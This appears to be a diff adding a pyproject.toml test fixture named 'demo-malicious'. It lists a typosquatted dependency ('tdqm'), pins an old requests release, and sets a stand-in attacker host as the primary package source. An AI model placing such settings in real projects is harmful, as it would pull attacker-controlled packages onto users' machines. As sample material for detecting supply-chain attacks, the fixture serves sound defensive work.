@@ -1,0 +1,13 @@
+[project]
+name = "demo-malicious"
+version = "0.1.0"
+requires-python = ">=3.11"
+dependencies = [
+    "tdqm",
+    "requests==2.19.0",
+]
+
+[[tool.poetry.source]]
+name = "evil"
+url = "https://packages.evil-corp.net/pypi"
+priority = "primary"
